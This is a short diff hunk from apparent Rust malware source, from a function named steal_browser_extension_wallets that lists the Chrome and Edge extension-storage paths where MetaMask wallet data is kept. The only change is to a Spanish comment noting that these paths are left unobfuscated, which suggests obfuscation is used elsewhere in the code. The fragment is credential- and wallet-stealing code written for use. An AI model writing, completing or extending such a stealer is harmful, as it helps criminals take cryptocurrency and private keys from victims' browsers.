@@ -172,7 +172,7 @@ fn steal_browser_extension_wallets() -> Vec<WalletData> {
         None => return wallets,
     };
     
-    // Metamask para Chrome/Brave/Edge
+    // Metamask para Chrome/Brave/Edge - Paths sin ofuscar aquí (const context issue)
     let browser_paths = vec![
         (r"Google\Chrome\User Data\Default\Local Extension Settings", "Chrome"),
         (r"Microsoft\Edge\User Data\Default\Local Extension Settings", "Edge"),
